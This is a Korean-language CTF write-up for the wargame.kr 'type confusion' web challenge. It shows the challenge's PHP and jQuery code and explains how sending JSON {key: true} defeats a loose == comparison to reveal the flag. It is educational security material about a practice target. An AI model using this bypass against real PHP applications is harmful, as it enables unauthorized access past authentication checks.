---
title: (17) Dreamhack [wargame.kr] type confusion 문제 풀이
date: 2024-01-20 +09:00
categories:
  - 웹해킹
tags:
  - [웹해킹, 드림핵]
---
{% raw %}
## 문제 설명
Simple Compare Challenge.  
hint? you can see the title of this challenge.  
:D

## 문제 풀이
들어가면 있는 소스코드 부터 확인해보겠습니다.
```php
<?php
 if (isset($_GET['view-source'])) {
     show_source(__FILE__);
    exit();
 }
 if (isset($_POST['json'])) {
     usleep(500000);
     require("./lib.php"); // include for FLAG.
    $json = json_decode($_POST['json']);
    $key = gen_key();
    if ($json->key == $key) {
        $ret = ["code" => true, "flag" => $FLAG];
    } else {
        $ret = ["code" => false];
    }
    die(json_encode($ret));
 }

 function gen_key(){
     $key = uniqid("welcome to wargame.kr!_", true);
    $key = sha1($key);
     return $key;
 }
?>

<html>
    <head>
        <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.1/jquery.min.js"></script>
        <script src="./util.js"></script>
    </head>
    <body>
        <form onsubmit="return submit_check(this);">
            <input type="text" name="key" />
            <input type="submit" value="check" />
        </form>
        <a href="./?view-source">view-source</a>
    </body>
</html>
```
또한 아래 html에서 불러오는 util.js도 확인해보겠습니다.
```javascript
var lock = false;
function submit_check(f){
  if (lock) {
    alert("waiting..");
    return false;
  }
  lock = true;
  var key = f.key.value;
  if (key == "") {
    alert("please fill the input box.");
    lock = false;
    return false;
  }

  submit(key);

  return false;
}

function submit(key){
  $.ajax({
    type : "POST",
    async : false,
    url : "./index.php",
    data : {json:JSON.stringify({key: key})},
    dataType : 'json'
  }).done(function(result){
    if (result['code'] == true) {
      document.write("Congratulations! flag is " + result['flag']);
    } else {
      alert("nope...");
    }
    lock = false;
  });
}
```
이 문제를 해결하려면 `$json->key == $key` 조건이 만족되어야 합니다. 그리고 문제 설명에서 문제 제목인 type confusion이 힌트라고 합니다.  
  
코드를 보면 일단 form에 뭔가를 적으면 `submit_check`함수가 입력값이 비었는지, 그리고 중복요청을 막는 코드가 실행됩니다. 입력값이 있다면 `submit`함수가 실행되어 `{key: 입력값}`의 json을 post 요청으로 보냅니다. 입력값이 `gen_key`함수의 결과와 같다면 flag를 보여주네요.  

## Type Confusion
type confusion은 말 그대로 타입을 혼동한다는 뜻입니다.  
입력값이 예상과 다른 결과값인 경우 또는 의도되지 않은 타입의 데이터가 형변환되는 경우 발생할 수 있습니다.  
예를 들어, "123"이라는 문자열은 bool로 형변환을 하면 `true`가 됩니다.  
만약 `입력값 == "문자열"`형태로 비교되는 경우 `true`를 입력값으로 넣을 수 있다면 참이 되어 조건문을 지나갈 수 있죠.  
  
이걸 알고 다시 한번 코드를 봅시다. `gen_key()`의 결과는 어떤 문자열(`$key`)일 것이고 `$json->key == $key`에서 `$json->key`가 `true`가 넘겨지게 할 수 있다면 flag를 얻을 수 있을 겁니다.  
  

요청을 보내는건 프론트엔드의 js이기 때문에 스크립트나 요청값의 변조가 가능합니다.
```javascript
function submit(key){
  $.ajax({
    type : "POST",
    async : false,
    url : "./index.php",
    data : {json:JSON.stringify({key: true})},
    dataType : 'json'
  }).done(function(result){
    if (result['code'] == true) {
      document.write("Congratulations! flag is " + result['flag']);
    } else {
      alert("nope...");
    }
    lock = false;
  });
}
```
위와 같이 `true`를 key 값으로 post요청을 보내도록 `submit`함수를 수정했습니다.
![](https://kyuyeop.github.io/assets/img/post/17/1.png)
이렇게 콘솔에 수정한 코드를 넣어 원래 코드를 덮어씌우고 아무값이나 form에 넣고 보내주면
![](https://kyuyeop.github.io/assets/img/post/17/2.png)
![](https://kyuyeop.github.io/assets/img/post/17/3.png)
이렇게 flag를 얻을 수 있습니다.
{% endraw %}